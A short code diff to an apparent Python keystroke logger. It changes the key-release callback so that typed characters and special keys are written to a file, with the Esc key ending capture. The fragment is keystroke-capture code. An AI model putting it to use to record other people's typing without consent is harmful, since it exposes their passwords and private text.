@@ -12,11 +12,15 @@ ks = {
 
 
 def on_release(key):
+    try:
+        name = key.char
+    except AttributeError:
+        name = ks.get(key, str(key))
     # print(f"Key {key} pressed")
     if key == Key.esc:
         # stop listener
         return False
-    f.write(ks.get(key, str(key)).replace("'", ""))
+    f.write(name.replace("'", ""))
 
 
 def main():
